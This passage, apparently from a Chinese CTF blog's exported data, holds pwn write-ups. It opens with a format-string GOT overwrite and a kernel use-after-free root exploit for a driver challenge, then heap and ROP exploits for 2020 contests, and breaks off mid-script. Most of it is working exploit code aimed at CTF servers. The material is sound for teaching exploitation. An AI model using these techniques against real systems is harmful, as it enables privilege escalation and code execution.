&#x27;$hn&#x27;p += &#x27;%&#x27; + str(high_sys - low_sys) + &#x27;c%&#x27; + str(offset + 1) + &#x27;$hn&#x27;   s(p)\n\nget shell使用’; ‘分割shell命令, 再调用strlen即调用system函数\nsl(&#x27;; /bin/sh&#x27;)\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;node3.buuoj.cn&quot;remotePort = 29458LOCAL = 0LIB   = 0r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------#--------------------------Exploit--------------------------def exploit():\tsprintf_got = 0x0804A030\t\tstrlen_got = 0x0804A024\toffset = 8\t# leak libc\tp = &#x27;A&#x27; # for alignment\tp += &#x27;%&#x27; + str(offset + 1) + &#x27;$s&#x27; + p32(sprintf_got)\ts(p)\tsprintf = u32(ru(&#x27;\\xf7&#x27;)[-3:] + &#x27;\\xf7&#x27;)\tli(&#x27;sprintf &#x27; + hex(sprintf))\t&#x27;&#x27;&#x27;\tselect:\t2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)\t&#x27;&#x27;&#x27;\tlibc = LibcSearcher(&#x27;sprintf&#x27;, sprintf)\tlibc_base = sprintf - libc.dump(&#x27;sprintf&#x27;)\tli(&#x27;libc_base &#x27; + hex(libc_base))\tsystem = libc_base + libc.dump(&#x27;system&#x27;)\tli(&#x27;system &#x27; + hex(system))\thigh_sys = system &gt;&gt; (8 * 2)\tlow_sys = system &amp; 0xFFFF\tli(&#x27;high_sys &#x27; + hex(high_sys))\tli(&#x27;low_sys  &#x27; + hex(low_sys))\t# modify strlen got\tpre_len = len(&#x27;Repeater:&#x27;) + 1 + 4 + 4\tp = &#x27;A&#x27; # for alignment\tp += p32(strlen_got + 0) # 8\tp += p32(strlen_got + 2) # 9\tp += &#x27;%&#x27; + str(low_sys - pre_len) + &#x27;c%&#x27; + str(offset + 0) + &#x27;$hn&#x27;\tp += &#x27;%&#x27; + str(high_sys - low_sys) + &#x27;c%&#x27; + str(offset + 1) + &#x27;$hn&#x27;\ts(p)\tsl(&#x27;; /bin/sh&#x27;)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\n\n\nKenel pwn ciscn 2017 baby driver第一天真正开始做kernel pwn类的题, 于用户空间做的体确实有点不太一样, 利用从python 转向c语言写与驱动交互的程序, 找驱动程序的漏洞, 然后提权为root\n知识预备权限在linux中每个进程都有它自己的权限,而标示着权限的那些信息,比如uid，gid等都是被放在一个叫cred的结构体当中的,也就是说每个进程中都有一个cred结构,如果能够修改进程的cred的uid和gid为0, 那么该进程的权限就为root权限了.以下是cred结构体:\nstruct cred &#123;    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC  0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif    kuid_t      uid;        /* real UID of the task */    kgid_t      gid;        /* real GID of the task */    kuid_t      suid;       /* saved UID of the task */    kgid_t      sgid;       /* saved GID of the task */    kuid_t      euid;       /* effective UID of the task */    kgid_t      egid;       /* effective GID of the task */    kuid_t      fsuid;      /* UID for VFS ops */    kgid_t      fsgid;      /* GID for VFS ops */    unsigned    securebits; /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;  /* caps we&#x27;re permitted */    kernel_cap_t    cap_effective;  /* caps we can actually use */    kernel_cap_t    cap_bset;   /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char   jit_keyring;    /* default keyring to attach requested * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key  *process_keyring; /* keyring private to this process */    struct key  *thread_keyring; /* keyring private to this thread */    struct key  *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;  /* subjective LSM security */#endif    struct user_struct *user;   /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;  /* supplementary groups for euid/fsgid */    struct rcu_head rcu;        /* RCU deletion hook */&#125;;\n\n当我们是root权限的时候,我们的uid是等于0的,另外此版本的cred的大小是0xa8;\nSLAB &amp; SLUB  kernel中没有libc，但是仍然需要内存的分配和释放，这时就会使用到kmalloc&amp;kfree  API（相当于用户态使用的malloc&amp;free）。kmalloc&amp;kfree的实现是通过SLAB或SLUB分配器，现在一般是SLUB分配器。分配器是通过一个多级的结构进行管理。首先有cache层，cache是一个结构，其中保存的对象分为空对象、部分使用的对象和完全使用的对象进行管理。对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。kmalloc使用了多个cache，每个cache对应一个2的幂次大小的一组内存对象。\n  SLAB和SLUB都是内核的内存管理机制。为了提高效率，SLAB要求系统暂时保留已经释放的内核对象空间，以便下次申请时不需要再次初始化和分配。但是SLAB比较严格，需要再次申请的数据类型和大小与原先的完全一样，并且不同cache的无法分在同一页内；而SLUB较为宽松，和堆分配机制更为相似。\n设备程序分析驱动中存在一个结构体\nstruct babydev_struct&#123;    char *device_buf;    size_t device_buf_len;&#125;;\n\nbabyopen函数int __fastcall babyopen(inode *inode, file *filp)&#123;  __int64 v2; // rdx  _fentry__(inode, filp);  //对babydev_struct.device_buf 进行开辟一个0x40大小的内存  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);  babydev_struct.device_buf_len = 0x40LL;  printk(&quot;device open\\n&quot;, 0x24000C0LL, v2);  return 0;&#125;\n\n\n\nbabywrite函数void __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)&#123;  size_t v4; // rdx  _fentry__(filp, buffer);  if ( babydev_struct.device_buf )  &#123;    if ( babydev_struct.device_buf_len &gt; v4 )      copy_from_user(babydev_struct.device_buf, buffer, v4); // 从用户空间拷贝数据到babydev_struct.device_buf  &#125;&#125;\n\nbabyread 函数void __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)&#123;  size_t v4; // rdx  _fentry__(filp, buffer);  if ( babydev_struct.device_buf )  &#123;    if ( babydev_struct.device_buf_len &gt; v4 )      copy_to_user(buffer, babydev_struct.device_buf, v4); //从内核中拷贝数据到用户空间  &#125;&#125;\n\n\n\nbabyioctrl函数// local variable allocation has failed, the output may be wrong!void __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)&#123;  size_t v3; // rdx  size_t v4; // rbx  __int64 v5; // rdx  _fentry__(filp, *(_QWORD *)&amp;command);  v4 = v3;  if ( command == 0x10001 )  &#123;    kfree(babydev_struct.device_buf);    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);// 根据用户来控制开辟内存空间的大小    babydev_struct.device_buf_len = v4;    printk(&quot;alloc done\\n&quot;, 0x24000C0LL, v5);  &#125;  else  &#123;    printk(&quot;\\x013defalut:arg is %ld\\n&quot;, v3, v3);  &#125;&#125;\n\nbabyrelease函数int __fastcall babyrelease(inode *inode, file *filp)&#123;  __int64 v2; // rdx  _fentry__(inode, filp);  kfree(babydev_struct.device_buf);             // 释放babydev_struct.device_buf, 对指针没有清0, 造成uaf漏洞  printk(&quot;device release\\n&quot;, filp, v2);  return 0;&#125;\n\n思路这个从用户态的pwn来看好像漏洞并不明显,但是我们现在是在内核态了,要把用户态的单线程的思维抛开了,从多线程的角度来思考。\n\n首先打开两次设备，通过ioctl将babydev_struct大小为的cred结构体的大小(不同版本kernel的可能不一样,需要通过源码去算);\n然后释放其中一个设备，fork出一个新进程，此时这个新进程的cred 的空间就会重新开辟, 然而系统就会把之前大小一样空闲内存空间分配给它,。\n第二个打开的文件描述符对这块空间进行写操作，只需要将uid和gid改为0，实现root提权\n\nexp// gcc exp.c -o exp -static -w#include&lt;unistd.h&gt;#include&lt;fcntl.h&gt;#include&lt;sys/stat.h&gt;#include&lt;stdlib.h&gt;int main(void) &#123;    \t// vul: uaf        int fd_1 = open(&quot;/dev/babydev&quot;, O_RDWR);        int fd_2 = open(&quot;/dev/babydev&quot;, O_RDWR); //babydev_struct.device_buf 记录的是 fd_2        pid_t pid;        ioctl(fd_1, 0x10001, 0xa8); // 开辟0xa8的内核空间, 命名为chunk1吧        if(-1 == fd_1 || -1 == fd_2) &#123;                puts(&quot;open babydev failed!\\n&quot;);                return -1;        &#125;        close(fd_1);  // 关闭fd_1, ioctl所开辟的0xa8空间, 释放掉chunk1内存,        pid = fork(); // fork 时有点类似与malloc中的fastbin原理, 子进程开辟cred内存的时候, 先遍历大小合适的空闲内存, 然后直接分配        // child process        if(pid == 0) &#123;                char buf[60] = &#123;0&#125;;                write(fd_2, buf, 60);  //向释放掉的chunk1内存中填充60个0, 然而也是该进程的cred结构体,使uid和gid为0, 提权为root                system(&quot;/bin/sh&quot;);     //运行子进程时会继承父进程的权限        &#125;else &#123;                wait();        &#125;        return 0;&#125;\n\n\n\n\n\n调试提取vmlinuxextract-vmlinux脚本如下:\n#!/bin/sh# SPDX-License-Identifier: GPL-2.0-only# ----------------------------------------------------------------------# extract-vmlinux - Extract uncompressed vmlinux from a kernel image## Inspired from extract-ikconfig# (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;## (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;## ----------------------------------------------------------------------check_vmlinux()&#123;\t# Use readelf to check if it&#x27;s a valid ELF\t# TODO: find a better to way to check that it&#x27;s really vmlinux\t#       and not just an elf\treadelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1\tcat $1\texit 0&#125;try_decompress()&#123;\t# The obscure use of the &quot;tr&quot; filter is to work around older versions of\t# &quot;grep&quot; that report the byte offset of the line instead of the pattern.\t# Try to find the header ($1) and decompress from here\tfor\tpos in `tr &quot;$1\\n$2&quot; &quot;\\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`\tdo\t\tpos=$&#123;pos%%:*&#125;\t\ttail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null\t\tcheck_vmlinux $tmp\tdone&#125;# Check invocation:me=$&#123;0##*/&#125;img=$1if\t[ $# -ne 1 -o ! -s &quot;$img&quot; ]then\techo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2\texit 2fi# Prepare temp files:tmp=$(mktemp /tmp/vmlinux-XXX)trap &quot;rm -f $tmp&quot; 0# That didn&#x27;t work, so retry after decompression.try_decompress &#x27;\\037\\213\\010&#x27; xy    gunziptry_decompress &#x27;\\3757zXZ\\000&#x27; abcde unxztry_decompress &#x27;BZh&#x27;          xy    bunzip2try_decompress &#x27;\\135\\0\\0\\0&#x27;   xxx   unlzmatry_decompress &#x27;\\211\\114\\132&#x27; xy    &#x27;lzop -d&#x27;try_decompress &#x27;\\002!L\\030&#x27;   xxx   &#x27;lz4 -d&#x27;try_decompress &#x27;(\\265/\\375&#x27;   xxx   unzstd# Finally check for uncompressed images or objects:check_vmlinux $img# Bail out:echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2\n\n保存为extract-vmlinux\n提取vmlinux, 方便调试\n./extract-vmlinux ./bzImage &gt; vmlinux\n\n启动gdbgdb ./vmlinux -q\n\n启动boot.sh获取babydriver的加载基址使用 cat &#x2F;proc&#x2F;moudles或者lsmod\n/ # lsmodbabydriver 16384 2 - Live 0xffffffffc0000000 (OE)\n\n\n\n导入符号表最后面填写babydriver的基址\nadd-symbol-file ./fs/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000\n\n\n\n调试qumu在boot.sh中添加参数如下:\n-gdb tcp::9999\n\n调试运行程序\n./boot.sh\n\n在gdb中连接该qemu程序\ntarget remote 127.0.0.1:9999\n\n运行如图\n\n先下个断点\n\n那么就和平时调试差不多了,只是调试相对比较慢而已, 下面就不演示了…\n太湖杯 2020exp#!/usr/bin/env python3#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.29&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;119.3.89.93&quot;server_port = 8014# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(i, sz, d):\tsla(&#x27;ce:&#x27;, &#x27;1&#x27;)\tsla(&#x27;:&#x27;, str(i))\tsla(&#x27;:&#x27;, str(sz))\tsa(&#x27;:&#x27;, d)def md(i, sz, d):\tsla(&#x27;ce:&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, str(i))\tsla(&#x27;:&#x27;, str(sz))\tif(len(d) &gt; 0):\t\tsa(&#x27;:&#x27;, d)\tdef rm(i):\tsla(&#x27;ce:&#x27;, &#x27;3&#x27;)\tsla(&#x27;:&#x27;, str(i))def dp(i):\tsla(&#x27;ce:&#x27;, &#x27;4&#x27;)\tsla(&#x27;:&#x27;, str(i))def cre7():\tsla(&#x27;ce:&#x27;, &#x27;5&#x27;)def gift(d):\tsla(&#x27;ce:&#x27;, &#x27;666&#x27;)\tsla(&#x27;:&#x27;, d)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tfor i in range(10):\t\tad(i, 0x18, &#x27;A&#x27; * 0x18)\trm(1)\tmd(0, 0, &#x27;&#x27;)\tdp(0)\tru(&#x27;:&#x27;)\tleak = u64(ru(&#x27;\\n&#x27;)[-6:] + b&#x27;\\x00\\x00&#x27;)\theap = leak - 0x2a0\tli(&#x27;heap: &#x27; + hex(heap))\tfor i in range(5):\t\trm(i + 2)\tmd(7, 0, &#x27;&#x27;)\tmd(7, 0x18, p64(heap + 0x250))\tad(0, 0x18, b&#x27;A&#x27;)\tad(0, 0x18, b&#x27;A&#x27;)\t\tgift(&#x27;none&#x27;)\tru(&#x27;0x&#x27;)\tleak = int(r(12), 16)\toffset = ( 0x7f50cd676140 - 0x7f50cd412000 ) # remote\t#offset = ( 0x7f6faf78a900 - 0x7f6faf53a000) # local\tlibc_base = leak - offset\tfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tad(0, 0x58, b&#x27;A&#x27;)\tad(1, 0x58, b&#x27;/bin/sh\\x00&#x27;)\tad(2, 0x58, b&#x27;A&#x27;)\tmd(0, 0, &#x27;&#x27;)\tmd(0, 0x58, p64(free_hook))\tgift(&#x27;A&#x27;)\tgift(p64(system))\tdb()\trm(1)\t#ad(5, 0x58, &#x27;A&#x27;)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\t\n\n\n\n强网杯 2018 core一个kernel pwn，来入入手。\n如何解压cpio文件sudo pacman -S ark\n\n直接使用ark解压软件解压即可。\n保护start scriptqemu-system-x86_64 \\-m 64M \\-kernel ./bzImage \\-initrd  ./core.cpio \\-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \\-s  \\-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\-nographic  \\\n\n开启了aslr保护\ndriverArch:     amd64-64-littleRELRO:    No RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x0)\n\n有cannary保护\ninit script#!/bin/shmount -t proc proc /procmount -t sysfs sysfs /sysmount -t devtmpfs none /dev/sbin/mdev -smkdir -p /dev/ptsmount -vt devpts -o gid=4,mode=620 none /dev/ptschmod 666 /dev/ptmxcat /proc/kallsyms &gt; /tmp/kallsymsecho 1 &gt; /proc/sys/kernel/kptr_restrictecho 1 &gt; /proc/sys/kernel/dmesg_restrictifconfig eth0 upudhcpc -i eth0ifconfig eth0 10.0.2.15 netmask 255.255.255.0route add default gw 10.0.2.2 insmod /core.kopoweroff -d 120 -f &amp;setsid /bin/cttyhack setuidgid 1000 /bin/shecho &#x27;sh end!\\n&#x27;umount /procumount /syspoweroff -d 0  -f\n\n在上面init脚本中出现关机命令， 把它注释掉重新打包为cpio文件就不会自动关机了。\n程序逻辑init_module函数__int64 init_module()&#123;  core_proc = proc_create(&quot;core&quot;, 438LL, 0LL, &amp;core_fops);  printk(&amp;unk_2DE);  return 0LL;&#125;\n\n\n\nexit_core 函数__int64 exit_core()&#123;  __int64 result; // rax  if ( core_proc )    result = remove_proc_entry(&quot;core&quot;);  return result;&#125;\n\n\n\ncore_ioctl函数__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)&#123;  __int64 v3; // rbx  v3 = a3;  switch ( a2 )  &#123;    case 0x6677889B:      core_read(a3);      break;    case 0x6677889C:      printk(&amp;unk_2CD);      off = v3;      break;    case 0x6677889A:      printk(&amp;unk_2B3);      core_copy_func(v3);      break;  &#125;  return 0LL;&#125;\n\n\n\ncore_read函数unsigned __int64 __fastcall core_read(__int64 a1)&#123;  __int64 v1; // rbx  __int64 *v2; // rdi  signed __int64 i; // rcx  unsigned __int64 result; // rax  __int64 v5; // [rsp-50h] [rbp-50h]  unsigned __int64 v6; // [rsp-10h] [rbp-10h]  v1 = a1;  v6 = __readgsqword(0x28u);  printk(&amp;unk_25B);  printk(&amp;unk_275);  v2 = &amp;v5;  for ( i = 16LL; i; --i )  &#123;    *(_DWORD *)v2 = 0;    v2 = (__int64 *)((char *)v2 + 4);  &#125;  strcpy((char *)&amp;v5, &quot;Welcome to the QWB CTF challenge.\\n&quot;);  result = copy_to_user(v1, (char *)&amp;v5 + off, 64LL);  if ( !result )    return __readgsqword(0x28u) ^ v6;  __asm &#123; swapgs &#125;  return result;&#125;\n\n\n\ncore_copy_funcsigned __int64 __fastcall core_copy_func(signed __int64 a1)&#123;  signed __int64 result; // rax  __int64 v2; // [rsp-50h] [rbp-50h]  unsigned __int64 v3; // [rsp-10h] [rbp-10h]  v3 = __readgsqword(0x28u);  printk(&amp;unk_215);  if ( a1 &gt; 63 )  &#123;    printk(&amp;unk_2A1);    result = 0xFFFFFFFFLL;  &#125;  else  &#123;    result = 0LL;    qmemcpy(&amp;v2, &amp;name, (unsigned __int16)a1); // vul  &#125;  return result;&#125;\n\n\n\n漏洞点若在core_copy_func函数中传入的参数为负数，造成整型溢出，即可实现堆栈溢出。\n​    \n","categories":["ctf"],"tags":["pwn"]},{"title":"2020年全国电信和互联网行业网络安全管理职业技能竞赛","url":"/2020/11/06/security/ctf/compitation/wp-nssc-2020/","content":"NSSC 2020 CTF WP [2020年全国电信和互联网行业网络安全管理职业技能竞赛（第九届）]Trials competition这次比赛表现得不是很好，题目不是很难，也怪自己没把握住时间，第三道比赛刚结束就打通了。。。这次名次为10，应该进线下了，下次好好加油！\n本次比赛排名如下:\n\npwn1[Echo]通过利用字符串漏洞泄漏libc基地址, elf基地址, 修改 _IO_FILE struct,然后打入stack 中的 &amp;main ret构造rop链\n#!/usr/bin/env python3#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;Echo&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;121.36.216.253&quot;server_port = 10001# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\t#leak elf\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, &#x27;7&#x27;)\tsl(&#x27;%20$p&#x27;)\tru(&#x27;0x&#x27;)\telf_base = int(r(12), 16) - (0x562a00b85150-  0x562a00b84000  )\tli(&#x27;elf_base: &#x27; + hex(elf_base))\tpop_rdi = elf_base + 0x11b3\t\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, &#x27;7&#x27;)\tsl(&#x27;%21$p&#x27;)\tru(&#x27;0x&#x27;)\tlibc_base = int(r(12), 16) - libc.sym[&#x27;__libc_start_main&#x27;] - 240\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tsys_addr = libc_base + libc.sym[&#x27;system&#x27;]\tsh_addr  = libc_base + 0x18ce17\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, &#x27;7&#x27;)\tsl(&#x27;%23$p&#x27;)\tru(&#x27;0x&#x27;)\tstack_ret = int(r(12), 16) - 0xe0\tli(&#x27;stack_ret: &#x27; + hex(stack_ret))\t_IO_2_1_stdin_ = libc_base + libc.sym[&#x27;_IO_2_1_stdin_&#x27;]\t_IO_buf_base = _IO_2_1_stdin_ + 0x8 * 7\tli(&#x27;_IO_buf_base: &#x27; + hex(_IO_buf_base))\tsla(&#x27;&gt;&gt;&#x27;, str(1))\tp = p64(_IO_buf_base)\tsl(p)\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsla(&#x27;:&#x27;, str(7))\t#sl(&#x27;%16$p&#x27;)\ts(&#x27;%16$hhn&#x27;)\tp = p64(_IO_2_1_stdin_ + 0x83) * 3\tp += p64(stack_ret) + p64(stack_ret + 0x8 * 3)\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsa(&#x27;:&#x27;, p) #length:\tsl(&#x27;&#x27;)\tfor i in range(0, len(p) - 1):\t\tsla(&#x27;&gt;&gt;&#x27;, str(2))\t\tsla(&#x27;:&#x27;, &#x27;,&#x27;)\t\tsl(&#x27; &#x27;)\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tp = p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)\tsla(&#x27;:&#x27;, p) #length:\tsl(&#x27;&#x27;)\t#db()\tsla(&#x27;&gt;&gt;&#x27;, str(3))def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env= &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\nflag{0HOk4cUYpmi6tVAjQSR5zdZRHPSnpeeW}\npwn2 [noteplus]if ( v6 &lt;= 0xF ) &#123;   if ( p_addr[v6] )   &#123;     std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Content: &quot;, 9LL);     addr = p_addr[v0];     size = p_size[v0];     if ( size != 8 )     &#123;       buf = (_BYTE *)(addr + 8);       v4 = (_BYTE *)(size + addr);       do       &#123;         read(0, buf, 1uLL);         if ( *buf == 10 )           break;         ++buf; //vul       &#125;       while ( v4 != buf );     &#125;   &#125; &#125;\n\n若开辟大小为0, 则可造成堆溢出, 修改tcahe bin fd，实现任意地址开辟，修改free_hook为system\n#!/usr/bin/env python3#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.27&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;121.36.245.213&quot;server_port = 23333# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(i, size):\tsla(&#x27;Your choice:&#x27;, &#x27;1&#x27;)\tsla(&#x27;:&#x27;, str(i))\tsla(&#x27;:&#x27;, str(size))\tdef rm(i):\tsla(&#x27;:&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, str(i))def md(i, d):\tsla(&#x27;:&#x27;, &#x27;3&#x27;)\tsla(&#x27;:&#x27;, str(i))\tsla(&#x27;:&#x27;, d)def 